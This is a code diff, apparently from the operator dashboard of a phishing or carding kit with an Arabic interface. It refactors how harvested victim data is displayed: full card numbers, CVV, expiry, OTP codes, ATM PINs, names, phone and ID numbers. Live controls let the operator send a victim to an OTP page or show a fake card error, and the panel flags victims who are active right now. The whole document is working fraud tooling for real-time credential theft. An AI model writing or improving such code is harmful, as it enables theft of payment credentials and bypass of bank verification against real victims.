@@ -16,6 +16,7 @@ import {
   Banknote,
   ChevronDown,
   ChevronUp,
+  Activity,
 } from "lucide-react";
 
 interface SubmissionRow {
@@ -34,6 +35,19 @@ interface StatsType {
   byType: { type: string; count: number }[];
 }
 
+// Attempt block interface for time-based grouping
+interface AttemptBlock {
+  attemptNumber: number;
+  startTime: string;
+  card?: SubmissionRow;
+  otp?: SubmissionRow;
+  atm?: SubmissionRow;
+  isActive: boolean;
+}
+
+const ATTEMPT_GAP_MS = 10 * 60 * 1000; // 10 minutes gap to split attempts
+const ACTIVE_THRESHOLD_MS = 5 * 60 * 1000; // 5 minutes to mark as active
+
 function parseData(raw: string | null): Record<string, string> {
   if (!raw) return {};
   try {
@@ -49,7 +63,83 @@ function formatAgo(iso: string) {
   if (secs < 60) return `${secs}ث`;
   const mins = Math.floor(secs / 60);
   if (mins < 60) return `${mins}د`;
-  return `${Math.floor(mins / 60)}س`;
+  const hours = Math.floor(mins / 60);
+  if (hours < 24) return `${hours}س ${mins % 60}د`;
+  return `${Math.floor(hours / 24)}ي`;
+}
+
+function formatTime(iso: string) {
+  return new Date(iso).toLocaleString("ar-EG", {
+    hour: "2-digit",
+    minute: "2-digit",
+    day: "numeric",
+    month: "short",
+  });
+}
+
+// Group rows into attempt blocks based on time gaps
+function groupIntoAttemptBlocks(rows: SubmissionRow[]): AttemptBlock[] {
+  if (rows.length === 0) return [];
+
+  // Sort by createdAt ascending (oldest first)
+  const sorted = [...rows].sort((a, b) => 
+    new Date(a.createdAt).getTime() - new Date(b.createdAt).getTime()
+  );
+
+  const blocks: AttemptBlock[] = [];
+  let currentBlock: AttemptBlock | null = null;
+  let attemptNumber = 1;
+
+  for (const row of sorted) {
+    if (!currentBlock) {
+      currentBlock = {
+        attemptNumber: attemptNumber++,
+        startTime: row.createdAt,
+        isActive: false,
+      };
+    }
+
+    // Check if we need to start a new block (time gap > 10 minutes AND it's a card)
+    const timeDiff = new Date(row.createdAt).getTime() - new Date(currentBlock.startTime).getTime();
+    
+    if (timeDiff > ATTEMPT_GAP_MS && row.type === "card") {
+      blocks.push(currentBlock);
+      currentBlock = {
+        attemptNumber: attemptNumber++,
+        startTime: row.createdAt,
+        isActive: false,
+      };
+    }
+
+    // Add row to current block
+    switch (row.type) {
+      case "card":
+        currentBlock.card = row;
+        break;
+      case "otp":
+        currentBlock.otp = row;
+        break;
+      case "atm":
+        currentBlock.atm = row;
+        break;
+    }
+  }
+
+  if (currentBlock) {
+    blocks.push(currentBlock);
+  }
+
+  // Mark the most recent block as active (if within 5 minutes)
+  if (blocks.length > 0) {
+    const latestBlock = blocks[blocks.length - 1];
+    const latestTime = new Date(latestBlock.startTime).getTime();
+    const now = Date.now();
+    if (now - latestTime < ACTIVE_THRESHOLD_MS) {
+      latestBlock.isActive = true;
+    }
+  }
+
+  return blocks;
 }
 
 function StatCard({ label, value, icon, color, onClick }: { label: string; value: number; icon: ReactNode; color: string; onClick?: () => void }) {
@@ -110,6 +200,118 @@ function SessionHistoryDialog({ open, rows, onClose }: { open: boolean; rows: Su
   );
 }
 
+// Single Attempt Block Component
+function AttemptBlockCard({
+  block,
+  onControl,
+  loadingAction,
+  isLatest,
+}: {
+  block: AttemptBlock;
+  onControl: (action: string) => Promise<void>;
+  loadingAction: string | null;
+  isLatest: boolean;
+}) {
+  const cardData = block.card ? parseData(block.card.data) : null;
+  const otpData = block.otp ? parseData(block.otp.data) : null;
+  const atmData = block.atm ? parseData(block.atm.data) : null;
+
+  const formattedCard = cardData?.cardNumber
+    ? cardData.cardNumber.replace(/(.{4})/g, "$1 ").trim()
+    : "—";
+
+  return (
+    <div className={`rounded-3xl border p-4 ${block.isActive ? "border-green-300 bg-green-50/50" : "border-slate-200 bg-white"}`}>
+      {/* Attempt Header */}
+      <div className="flex items-center justify-between mb-3">
+        <div className="flex items-center gap-2">
+          <span className={`text-xs font-bold px-2 py-1 rounded-full ${block.isActive ? "bg-green-100 text-green-700" : "bg-slate-100 text-slate-600"}`}>
+            المحاولة #{block.attemptNumber}
+          </span>
+          {block.isActive && (
+            <span className="flex items-center gap-1 text-xs text-green-600">
+              <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
+              نشط الآن
+            </span>
+          )}
+        </div>
+        <span className="text-xs text-slate-500" dir="ltr">{formatTime(block.startTime)}</span>
+      </div>
+
+      {/* Card Data */}
+      {block.card ? (
+        <div className="rounded-2xl border border-slate-100 bg-slate-50 p-3 mb-3">
+          <div className="flex items-center justify-between mb-2">
+            <span className="text-xs font-semibold text-slate-500">البطاقة</span>
+            <CreditCard className="w-4 h-4 text-slate-400" />
+          </div>
+          <p className="text-lg font-bold font-mono text-slate-900" dir="ltr">{formattedCard}</p>
+          <div className="mt-2 grid grid-cols-3 gap-2 text-xs text-slate-600">
+            <div><span className="text-slate-400">المالك:</span> {cardData?.cardHolder ?? "—"}</div>
+            <div><span className="text-slate-400">انتهاء:</span> {cardData?.expiry ?? "—"}</div>
+            <div><span className="text-slate-400">CVV:</span> {cardData?.cvv ?? "—"}</div>
+          </div>
+        </div>
+      ) : (
+        <div className="rounded-2xl border border-dashed border-slate-200 bg-slate-50 p-3 mb-3 text-xs text-slate-400 text-center">
+          لا توجد بطاقة لهذه المحاولة
+        </div>
+      )}
+
+      {/* OTP or ATM Data */}
+      {block.otp ? (
+        <div className="rounded-2xl border border-green-200 bg-green-50 p-3 mb-3">
+          <div className="flex items-center justify-between mb-2">
+            <span className="text-xs font-semibold text-green-700">رمز OTP</span>
+            <KeyRound className="w-4 h-4 text-green-500" />
+          </div>
+          <p className="text-2xl font-bold font-mono text-green-800" dir="ltr">{otpData?.otpCode ?? "—"}</p>
+          <span className="text-xs text-green-600 mt-1 block">{formatAgo(block.otp.createdAt)}</span>
+        </div>
+      ) : block.atm ? (
+        <div className="rounded-2xl border border-blue-200 bg-blue-50 p-3 mb-3">
+          <div className="flex items-center justify-between mb-2">
+            <span className="text-xs font-semibold text-blue-700">رمز ATM</span>
+            <Banknote className="w-4 h-4 text-blue-500" />
+          </div>
+          <p className="text-xl font-bold font-mono text-blue-800" dir="ltr">{atmData?.atmCode ?? "—"}</p>
+          <span className="text-xs text-blue-600 mt-1 block">{formatAgo(block.atm.createdAt)}</span>
+        </div>
+      ) : isLatest ? (
+        <div className="rounded-2xl border border-dashed border-orange-200 bg-orange-50/50 p-4 mb-3 text-center">
+          <span className="text-sm text-orange-600">⏳ بانتظار إدخال رمز OTP لهذه البطاقة...</span>
+        </div>
+      ) : (
+        <div className="rounded-2xl border border-slate-100 bg-slate-50 p-3 mb-3 text-xs text-slate-400 text-center">
+          لم يتم إدخال رمز OTP
+        </div>
+      )}
+
+      {/* Action Buttons - Only for the latest attempt */}
+      {isLatest && (
+        <div className="grid grid-cols-2 gap-2 mt-2">
+          <button
+            type="button"
+            disabled={loadingAction === "go_otp"}
+            onClick={() => void onControl("go_otp")}
+            className="rounded-2xl bg-green-600 px-3 py-2 text-xs font-semibold text-white hover:bg-green-700 disabled:cursor-not-allowed disabled:opacity-50"
+          >
+            {loadingAction === "go_otp" ? "...جارٍ" : "✓ تحويل لـ OTP"}
+          </button>
+          <button
+            type="button"
+            disabled={loadingAction === "card_error"}
+            onClick={() => void onControl("card_error")}
+            className="rounded-2xl border border-red-200 bg-red-50 px-3 py-2 text-xs font-semibold text-red-700 hover:bg-red-100 disabled:cursor-not-allowed disabled:opacity-50"
+          >
+            {loadingAction === "card_error" ? "...جارٍ" : "✗ خطأ البطاقة"}
+          </button>
+        </div>
+      )}
+    </div>
+  );
+}
+
 function SessionBox({
   sessionId,
   rows,
@@ -134,36 +336,24 @@ function SessionBox({
   onOpenHistory: () => void;
 }) {
   const [expanded, setExpanded] = useState(true);
-  const [showOldCards, setShowOldCards] = useState(false);
   const [loadingAction, setLoadingAction] = useState<string | null>(null);
 
+  // Get initial data
   const initialRow = rows.find((row) => row.type === "initial");
   const initialData = parseData(initialRow?.data ?? null);
   const name = initialData.ownerName || "مستخدم";
   const phone = initialData.phone || "بدون هاتف";
-  const cardRows = rows.filter((row) => row.type === "card");
-  const latestCard = cardRows[cardRows.length - 1];
-  const oldCards = cardRows.slice(0, -1);
-  const cardData = parseData(latestCard?.data ?? null);
-  const otpRows = rows.filter((row) => row.type.startsWith("otp"));
-  const atmRows = rows.filter((row) => row.type === "atm");
-  const lastActivity = rows[rows.length - 1]?.createdAt ?? rows[0]?.createdAt;
 
-  const statusBadge = blocked
-    ? <Badge className="bg-red-100 text-red-700 border-red-200 text-[10px]">محظور</Badge>
-    : otpRows.length > 0
-      ? <Badge className="bg-green-100 text-green-700 border-green-200 text-[10px]">OTP ✓</Badge>
-      : cardRows.length > 0
-        ? <Badge className="bg-orange-100 text-orange-700 border-orange-200 text-[10px] animate-pulse">ينتظر</Badge>
-        : <Badge variant="outline" className="text-slate-400 text-[10px]">بيانات فقط</Badge>;
+  // Group into attempt blocks
+  const attemptBlocks = groupIntoAttemptBlocks(rows);
+  const latestActivity = rows.length > 0 
+    ? [...rows].sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime())[0].createdAt 
+    : null;
 
-  const formattedCard = latestCard && cardData.cardNumber
-    ? cardData.cardNumber.replace(/(.{4})/g, "$1 ").trim()
-    : "—";
-
-  useEffect(() => {
-    setExpanded(cardRows.length > 0 || otpRows.length > 0);
-  }, [cardRows.length, otpRows.length]);
+  // Check if session is active (within 5 minutes of last activity)
+  const isSessionActive = latestActivity 
+    ? Date.now() - new Date(latestActivity).getTime() < ACTIVE_THRESHOLD_MS 
+    : false;
 
   const handleControl = async (action: string) => {
     setLoadingAction(action);
@@ -175,8 +365,9 @@ function SessionBox({
   };
 
   return (
-    <div className={`rounded-3xl border bg-white shadow-sm transition ${selected ? "ring-2 ring-blue-400" : ""}`}>
+    <div className={`rounded-3xl border bg-white shadow-sm transition ${selected ? "ring-2 ring-blue-400" : ""} ${blocked ? "opacity-75" : ""}`}>
       <div className="p-4">
+        {/* Session Header */}
         <div className="flex flex-col gap-3 sm:flex-row sm:items-start sm:justify-between">
           <div className="flex items-start gap-3">
             <input
@@ -192,13 +383,27 @@ function SessionBox({
                     <p className="text-sm font-semibold text-slate-900 truncate">{name}</p>
                     <p className="text-xs text-slate-500" dir="ltr">{phone}</p>
                   </div>
-                  <div className="flex items-center gap-2 text-xs text-slate-500">
-                    <span dir="ltr">{lastActivity ? formatAgo(lastActivity) : "—"}</span>
+                  <div className="flex items-center gap-2 text-xs">
+                    {latestActivity && (
+                      <span className="text-slate-400">{formatAgo(latestActivity)}</span>
+                    )}
                     {expanded ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                   </div>
                 </div>
                 <div className="mt-2 flex items-center justify-between gap-2">
-                  {statusBadge}
+                  {blocked ? (
+                    <Badge className="bg-red-100 text-red-700 border-red-200 text-[10px]">محظور</Badge>
+                  ) : isSessionActive ? (
+                    <span className="flex items-center gap-1">
+                      <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
+                      <span className="text-[10px] text-green-600 font-medium">نشط الآن</span>
+                    </span>
+                  ) : (
+                    <span className="flex items-center gap-1">
+                      <span className="w-2 h-2 rounded-full bg-slate-400" />
+                      <span className="text-[10px] text-slate-500">غير نشط</span>
+                    </span>
+                  )}
                   <span className="text-[11px] text-slate-400">#{sessionId.slice(0, 8)}</span>
                 </div>
               </button>
@@ -210,130 +415,53 @@ function SessionBox({
               type="button"
               onClick={onOpenHistory}
               className="rounded-2xl border border-slate-200 bg-slate-50 px-3 py-2 text-xs text-slate-700 hover:bg-slate-100"
-            >سجل كامل</button>
+            >
+              سجل كامل
+            </button>
             <button
               type="button"
               onClick={blocked ? onUnblock : onBlock}
               className={`rounded-2xl px-3 py-2 text-xs font-semibold ${blocked ? "border border-green-200 bg-green-50 text-green-700 hover:bg-green-100" : "border border-slate-200 bg-slate-50 text-slate-700 hover:bg-slate-100"}`}
-            >{blocked ? "رفع الحظر" : "حظر"}</button>
+            >
+              {blocked ? "رفع الحظر" : "حظر"}
+            </button>
             <button
               type="button"
               onClick={onDelete}
               className="rounded-2xl border border-red-200 bg-red-50 px-3 py-2 text-xs text-red-700 hover:bg-red-100"
-            >سلة المهملات</button>
+            >
+              سلة المهملات
+            </button>
           </div>
         </div>
 
+        {/* Timeline Content */}
         {expanded && (
-          <div className="mt-4 space-y-4 border-t border-slate-100 pt-4">
-            {latestCard ? (
-              <div className="rounded-3xl border border-slate-200 bg-slate-50 p-4">
-                <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
-                  <div>
-                    <p className="text-xs font-semibold text-slate-500">أحدث بطاقة</p>
-                    <p className="mt-2 text-lg font-bold text-slate-900 font-mono" dir="ltr">{formattedCard}</p>
-                  </div>
-                  <span className="text-xs text-slate-500" dir="ltr">{formatAgo(latestCard.createdAt)}</span>
-                </div>
-                <div className="mt-4 grid gap-3 sm:grid-cols-2 text-xs text-slate-600">
-                  <div>المالك: {cardData.cardHolder ?? "—"}</div>
-                  <div>انتهاء: {cardData.expiry ?? "—"}</div>
-                  <div>CVV: {cardData.cvv ?? "—"}</div>
-                  <div>الهوية: {initialData.idNumber ?? "—"}</div>
-                </div>
-                {oldCards.length > 0 && (
-                  <div className="mt-4">
-                    <button
-                      type="button"
-                      onClick={() => setShowOldCards((value) => !value)}
-                      className="text-xs text-blue-600 hover:underline"
-                    >{showOldCards ? "إخفاء" : "عرض"} البطاقات السابقة ({oldCards.length})</button>
-                    {showOldCards && (
-                      <div className="mt-3 space-y-3">
-                        {oldCards.map((card) => {
-                          const data = parseData(card.data);
-                          return (
-                            <div key={card.id} className="rounded-3xl border border-red-100 bg-red-50 p-3 text-xs">
-                              <div className="flex items-center justify-between text-slate-500 mb-2">
-                                <span>سجل سابق</span>
-                                <span dir="ltr">{formatAgo(card.createdAt)}</span>
-                              </div>
-                              <div className="font-mono font-semibold text-red-700" dir="ltr">{(data.cardNumber ?? "—").toString().replace(/(.{4})/g, "$1 ").trim()}</div>
-                              <div className="mt-2 flex flex-wrap gap-2 text-slate-500 text-[11px]">
-                                <span>{data.cardHolder ?? "—"}</span>
-                                <span>{data.expiry ?? "—"}</span>
-                                <span>{data.cvv ? `CVV ${data.cvv}` : "—"}</span>
-                              </div>
-                            </div>
-                          );
-                        })}
-                      </div>
-                    )}
-                  </div>
-                )}
+          <div className="mt-4 space-y-3 border-t border-slate-100 pt-4">
+            {attemptBlocks.length === 0 ? (
+              <div className="rounded-3xl border border-dashed border-slate-300 bg-slate-50 p-4 text-xs text-slate-500 text-center">
+                <Activity className="w-8 h-8 mx-auto mb-2 text-slate-300" />
+                لا توجد محاولات حتى الآن
               </div>
             ) : (
-              <div className="rounded-3xl border border-dashed border-slate-300 bg-slate-50 p-4 text-xs text-slate-500">
-                لا توجد بطاقة حتى الآن — الجلسة جاهزة لإدخال النتائج.
+              <div className="space-y-3">
+                {/* Render blocks in reverse order (latest first) */}
+                {[...attemptBlocks].reverse().map((block, index) => (
+                  <AttemptBlockCard
+                    key={block.attemptNumber}
+                    block={block}
+                    onControl={handleControl}
+                    loadingAction={loadingAction}
+                    isLatest={index === 0}
+                  />
+                ))}
               </div>
             )}
 
-            {otpRows.length > 0 && (
-              <div className="rounded-3xl border border-slate-200 bg-white p-4">
-                <div className="flex items-center justify-between text-xs font-semibold text-green-700 mb-3">
-                  <span>رموز OTP</span>
-                  <span>{otpRows.length} رمز</span>
-                </div>
-                <div className="space-y-2">
-                  {otpRows.map((otp, index) => {
-                    const data = parseData(otp.data);
-                    return (
-                      <div key={otp.id} className="rounded-2xl bg-green-50 p-3 text-xs text-slate-700">
-                        <div className="flex items-center justify-between gap-3 mb-2">
-                          <span className="font-semibold text-green-700">محاولة {index + 1}</span>
-                          <span className="text-slate-500" dir="ltr">{formatAgo(otp.createdAt)}</span>
-                        </div>
-                        <div className="font-mono text-base font-bold text-green-900" dir="ltr">{data.otpCode ?? "—"}</div>
-                      </div>
-                    );
-                  })}
-                </div>
-              </div>
-            )}
-
-            {atmRows.length > 0 && (
-              <div className="rounded-3xl border border-slate-200 bg-white p-4 text-xs text-slate-700">
-                <div className="flex items-center justify-between mb-3 text-slate-500">
-                  <span>بيانات ATM</span>
-                </div>
-                {atmRows.map((atm) => {
-                  const data = parseData(atm.data);
-                  return (
-                    <div key={atm.id} className="rounded-2xl bg-slate-50 p-3 mb-2">
-                      <div className="flex items-center justify-between text-slate-500 text-[11px] mb-1">
-                        <span>رمز ATM</span>
-                        <span dir="ltr">{formatAgo(atm.createdAt)}</span>
-                      </div>
-                      <div className="font-mono font-semibold">{data.atmCode ?? "—"}</div>
-                    </div>
-                  );
-                })}
-              </div>
-            )}
-
-            <div className="grid gap-2 sm:grid-cols-2">
-              <button
-                type="button"
-                disabled={loadingAction === "go_otp"}
-                onClick={() => void handleControl("go_otp")}
-                className="rounded-3xl bg-green-600 px-4 py-3 text-xs font-semibold text-white hover:bg-green-700 disabled:cursor-not-allowed disabled:opacity-50"
-              >{loadingAction === "go_otp" ? "...جارٍ" : "تحويل إلى OTP"}</button>
-              <button
-                type="button"
-                disabled={loadingAction === "card_error"}
-                onClick={() => void handleControl("card_error")}
-                className="rounded-3xl border border-red-200 bg-red-50 px-4 py-3 text-xs font-semibold text-red-700 hover:bg-red-100 disabled:cursor-not-allowed disabled:opacity-50"
-              >{loadingAction === "card_error" ? "...جارٍ" : "إبلاغ خطأ في البطاقة"}</button>
+            {/* Session Info */}
+            <div className="text-[11px] text-slate-400 border-t border-slate-100 pt-3 flex items-center justify-between">
+              <span>{attemptBlocks.length} محاولة</span>
+              <span>ID: {sessionId.slice(0, 12)}...</span>
             </div>
           </div>
         )}
